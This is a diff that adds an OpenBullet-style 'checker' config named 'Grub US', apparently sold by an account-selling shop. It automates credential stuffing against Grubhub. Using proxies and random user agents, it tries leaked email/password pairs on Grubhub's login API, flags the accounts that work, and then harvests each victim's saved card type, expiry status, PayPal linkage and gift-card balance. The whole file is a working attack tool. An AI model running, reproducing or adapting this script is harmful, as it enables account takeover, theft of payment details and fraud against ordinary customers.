@@ -1,0 +1,133 @@
+[SETTINGS]
+{
+  "Name": "Grub US",
+  "SuggestedBots": 25,
+  "MaxCPM": 0,
+  "LastModified": "2020-02-10T19:52:24.8748187+01:00",
+  "AdditionalInfo": "",
+  "Author": "https://shoppy.gg/@CheapAccountsSel",
+  "Version": "1.1.5",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 5,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "Credentials",
+  "AllowedWordlist2": "Credentials",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GetRandomUA -> VAR "ua" 
+
+#GET_CLIENT_ID REQUEST GET "https://www.grubhub.com/service-worker.js" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Accept: */*" 
+  HEADER "authority: www.grubhub.com" 
+  HEADER "method: GET" 
+  HEADER "path: /service-worker.js" 
+  HEADER "scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://www.grubhub.com/service-worker.js" 
+  HEADER "service-worker: script" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
+
+#PARSE_CLIENT_ID PARSE "<SOURCE>" LR "clientId:\"beta_" "\",hostName:\"" -> VAR "CLIENTID" 
+
+REQUEST POST "https://api-gtm.grubhub.com/auth" 
+  CONTENT "{\"brand\":\"GRUBHUB\",\"client_id\":\"beta_<CLIENTID>\",\"device_id\":-1752432658,\"email\":\"<USERNAME>\",\"password\":\"<PASSWORD>\"}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer 06c14fff-42d3-4f18-808c-5d798e9cedb6" 
+  HEADER "X-Served-By: cache-jfk8131-JFK" 
+  HEADER "X-Cache: MISS" 
+  HEADER "X-Cache-Hits: 0" 
+  HEADER "Vary: origin" 
+  HEADER "Accept-Ranges: bytes" 
+  HEADER "gh-request-id: 8eeaec90-611c-11e9-a42e-71a26aeabb1c" 
+  HEADER "Fastly-Restarts: 1" 
+  HEADER "access-control-allow-credentials: true" 
+  HEADER "access-control-allow-origin: https://www.grubhub.com" 
+  HEADER "access-control-expose-headers: gh-test,Content-Length,Location" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"email\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+
+#uid PARSE "<SOURCE>" LR "\":\"GRUBHUB\",\"ud_id\":\"" "\",\"created_date\":" -> VAR "uid" 
+
+#token PARSE "<SOURCE>" LR "\":{\"access_token\":\"" "\",\"token_type\":" -> VAR "token" 
+
+REQUEST GET "https://api-gtm.grubhub.com/payments/<uid>/credit_card" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "authority: api-gtm.grubhub.com" 
+  HEADER "scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US;q=0.8,en;q=0.7" 
+  HEADER "authorization: Bearer <token>" 
+  HEADER "cache-control: no-cache" 
+  HEADER "if-modified-since: 0" 
+  HEADER "origin: https://www.grubhub.com" 
+  HEADER "referer: https://www.grubhub.com/account/payment" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+
+#cc PARSE "<SOURCE>" LR "\"credit_card_type\":\"" "\",\"credit_card_last4" CreateEmpty=FALSE -> CAP "cc" 
+
+PARSE "<SOURCE>" LR ",\"expired\":" ",\"nonce\":" CreateEmpty=FALSE -> CAP "IsExpired" 
+
+REQUEST GET "https://api-gtm.grubhub.com/payments/<uid>/paypal_express" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "authority: api-gtm.grubhub.com" 
+  HEADER "scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US;q=0.8,en;q=0.7" 
+  HEADER "authorization: Bearer <token>" 
+  HEADER "cache-control: no-cache" 
+  HEADER "if-modified-since: 0" 
+  HEADER "origin: https://www.grubhub.com" 
+  HEADER "referer: https://www.grubhub.com/account/payment" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+
+#pp PARSE "<SOURCE>" LR "" "" CreateEmpty=FALSE -> CAP "pp" 
+
+REQUEST GET "https://api-gtm.grubhub.com/codes/vault/<uid>/giftcards" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "authority: api-gtm.grubhub.com" 
+  HEADER "scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US;q=0.8,en;q=0.7" 
+  HEADER "authorization: Bearer <token>" 
+  HEADER "cache-control: no-cache" 
+  HEADER "if-modified-since: 0" 
+  HEADER "origin: https://www.grubhub.com" 
+  HEADER "referer: https://www.grubhub.com/account/giftcard" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+
+#gc PARSE "<SOURCE>" LR "total_amount_remaining\":" "}" -> CAP "GC BAL" 
+
